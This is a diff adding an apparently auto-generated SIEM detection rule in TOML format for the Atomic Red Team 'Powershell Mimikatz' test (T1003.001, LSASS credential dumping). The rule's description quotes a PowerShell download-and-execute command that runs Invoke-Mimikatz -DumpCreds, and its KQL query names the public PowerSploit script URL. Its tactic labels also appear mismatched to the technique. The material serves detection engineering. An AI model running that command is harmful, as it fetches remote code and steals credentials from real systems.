@@ -1,0 +1,39 @@
+[rule]
+author = [ "AtomicRedTeam-Automation",]
+description = "Detection for specific test 'Powershell Mimikatz' (GUID: 66fb0bc1-3c3f-47e9-a298-550ecfefacbc) of technique T1003.001 (OS Credential Dumping: LSASS Memory). Test Description: Dumps credentials from memory via Powershell by invoking a remote mimikatz script.\nIf Mimikatz runs successfully you will see several usernames and hashes output to the screen.\nCommon failures include seeing an \\\\\\\"access denied\\\\\\\" error which results when Anti-Virus blocks execution. \nOr, if you try to run the test without the required administrative privileges you will see this error near the bottom of the output to the screen \\\"ERROR kuhl_m_sekurlsa_acquireLSA\\\". Command/Steps: IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds\n"
+from = "now-9m"
+rule_id = "36ff55c9-f08f-48d9-a6cb-ebf1feebb523"
+language = "kql"
+name = "Atomic Test: T1003.001 - Powershell Mimikatz"
+output_index = ".siem-signals-default"
+references = [ "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1003.001/T1003.001.yaml",]
+risk_score = 50
+severity = "medium"
+tags = [ "AtomicRedTeam", "T1003.001", "66fb0bc1-3c3f-47e9-a298-550ecfefacbc", "windows",]
+type = "query"
+query = "(process.name : (\\\"powershell.exe\\\", \\\"pwsh.exe\\\", \\\"powershell_ise.exe\\\") OR process.parent.name : (\\\"powershell.exe\\\", \\\"pwsh.exe\\\", \\\"powershell_ise.exe\\\")) AND (powershell.script_block_text : \\\"*(New-Object*\\\" AND powershell.script_block_text : \\\"*Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1')*\\\" AND powershell.script_block_text : \\\"*Invoke-Mimikatz*\\\" OR (process.command_line : \\\"*(New-Object*\\\" AND process.command_line : \\\"*Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1')*\\\" AND process.command_line : \\\"*Invoke-Mimikatz*\\\"))"
+version = 1
+index = [ "logs-endpoint.events.*", "winlogbeat-*", "logs-windows.*", "logs-linux.*", "logs-macos.*",]
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+[[rule.threat.technique]]
+id = "T1003.001"
+name = "Powershell Mimikatz"
+reference = "https://attack.mitre.org/techniques/T1003/001"
+
+[[rule.threat.tactic]]
+id = "TA0003"
+name = "Persistence"
+reference = "https://attack.mitre.org/techniques/T1003/001"
+
+[[rule.threat.tactic]]
+id = "TA0004"
+name = "Privilege Escalation"
+reference = "https://attack.mitre.org/techniques/T1003/001"
+
+[[rule.threat.tactic]]
+id = "TA0005"
+name = "Defense Evasion"
+reference = "https://attack.mitre.org/techniques/T1003/001"
+
+
